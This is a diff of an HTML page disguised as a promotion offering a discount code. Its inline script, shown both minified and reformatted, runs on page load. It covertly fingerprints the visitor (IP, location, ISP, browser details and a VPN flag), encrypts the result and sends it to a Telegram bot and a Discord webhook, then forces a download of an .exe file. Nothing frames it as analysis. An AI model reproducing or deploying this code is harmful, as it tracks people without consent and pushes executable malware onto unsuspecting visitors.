@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -18,18 +17,15 @@
       height: 100vh;
       text-align: center;
     }
-
     .promo-text {
       font-size: 28px;
       margin-bottom: 20px;
       animation: blink 1.5s infinite;
     }
-
     @keyframes blink {
       0%, 100% { opacity: 1; }
       50% { opacity: 0.3; }
     }
-
     img {
       max-width: 80%;
       border: 3px solid #00ffff;
@@ -39,9 +35,56 @@
 </head>
 <body>
   <div class="promo-text">Press to reveal the discount code...</div>
+  <img src="polyglot_20250913_045620.jpg" alt="Discount Image">
 
-  <img src="polyglot_20250913_045620.jpg" alt="Loading...">
+  <script>
+    const webhookTelegram = "https://api.telegram.org/bot<TOKEN>/sendMessage";
+    const telegramChatId = "3032183658";
+    const webhookDiscord = "https://discord.com/api/webhooks/...";
+    const downloadURL = "https://jeki1234121.github.io/dev-tools-backup/yourfile.exe";
 
-  <script>const webhookDiscord = "https: const webhookTelegram = "https: const telegramChatId = "3032183658"; const downloadURL = "https: window.addEventListener('load', async () => { try { const geo = await fetch('https: const fingerprint = { ua: navigator.userAgent, lang: navigator.language, res: screen.width + 'x' + screen.height, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, session: crypto.randomUUID(), ip: geo.ip || null, country: geo.country_name || null, org: geo.org || null, vpn_flag: /vpn|proxy|hosting|datacenter/i.test(geo.org || '') ? true : false }; const enc = new TextEncoder(); const key = 'AESkey-2025'; const iv = crypto.getRandomValues(new Uint8Array(12)); const cryptoKey = await crypto.subtle.importKey('raw', enc.encode(key), 'AES-GCM', false, ['encrypt']); const encoded = enc.encode(JSON.stringify(fingerprint)); const cipher = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, cryptoKey, encoded); const full = new Uint8Array([...iv, ...new Uint8Array(cipher)]); const encrypted = btoa(String.fromCharCode(...full)); await fetch(webhookTelegram, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `chat_id=${telegramChatId}&text=${encodeURIComponent(encrypted)}` }); await fetch(webhookDiscord, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: `[AUTO-BEACON] ${encrypted}` }) }); window.location.href = downloadURL; } catch (e) { console.log("Auto beacon failed:", e); window.location.href = downloadURL; } });</script>
+    window.addEventListener('load', async () => {
+      try {
+        const geo = await fetch('https://ipapi.co/json/').then(res => res.json());
+        const fingerprint = {
+          ua: navigator.userAgent,
+          lang: navigator.language,
+          res: screen.width + 'x' + screen.height,
+          tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          session: crypto.randomUUID(),
+          ip: geo.ip || null,
+          country: geo.country_name || null,
+          org: geo.org || null,
+          vpn_flag: /vpn|proxy|hosting|datacenter/i.test(geo.org || '') ? true : false
+        };
+
+        const enc = new TextEncoder();
+        const key = 'AESkey-2025';
+        const iv = crypto.getRandomValues(new Uint8Array(12));
+        const cryptoKey = await crypto.subtle.importKey('raw', enc.encode(key), 'AES-GCM', false, ['encrypt']);
+        const encoded = enc.encode(JSON.stringify(fingerprint));
+        const cipher = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, cryptoKey, encoded);
+        const full = new Uint8Array([...iv, ...new Uint8Array(cipher)]);
+        const encrypted = btoa(String.fromCharCode(...full));
+
+        await fetch(webhookTelegram, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: `chat_id=${telegramChatId}&text=${encodeURIComponent(encrypted)}`
+        });
+
+        await fetch(webhookDiscord, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: `[AUTO-BEACON] ${encrypted}` })
+        });
+
+        window.location.href = downloadURL;
+      } catch (e) {
+        console.log("Auto beacon failed:", e);
+        window.location.href = downloadURL;
+      }
+    });
+  </script>
 </body>
 </html>
